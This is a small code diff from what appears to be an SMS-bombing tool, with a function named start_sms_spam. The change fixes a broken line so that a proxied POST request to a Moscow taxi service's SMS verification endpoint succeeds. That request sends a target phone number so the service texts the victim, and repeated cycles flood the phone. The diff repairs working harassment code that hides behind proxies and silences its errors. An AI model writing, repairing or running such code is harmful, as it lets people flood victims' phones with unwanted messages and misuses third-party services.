@@ -60,7 +60,7 @@ async def start_sms_spam(phone, cycles):
                 logger.warning(SMS_ERR)
 
             try:
-                logger.debug(requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res", proxies=proxies, timeout=2])
+                logger.debug(requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}, proxies=proxies, timeout=2).json()["res"])
             except:
                 logger.warning(SMS_ERR)
 
